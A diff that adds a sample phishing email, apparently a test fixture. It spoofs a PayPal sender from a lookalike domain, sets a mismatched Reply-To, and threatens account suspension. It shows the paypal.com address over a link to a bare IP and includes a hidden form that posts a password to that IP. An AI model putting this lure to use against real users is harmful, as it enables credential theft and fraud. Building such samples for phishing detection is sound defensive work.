@@ -1,0 +1,10 @@
+From: "PayPal Security" <service@paypa1-secure.xyz>
+Reply-To: help@other-domain.ru
+To: victim@example.org
+Subject: URGENT: your account is suspended
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>Dear customer, we detected unusual activity. Verify your account within 24 hours or it will be locked.</p>
+<a href="http://198.51.100.7/login">https://www.paypal.com/signin</a>
+<form action="http://198.51.100.7/p"><input name="password"></form>
+<div style="display:none">hidden</div></body></html>
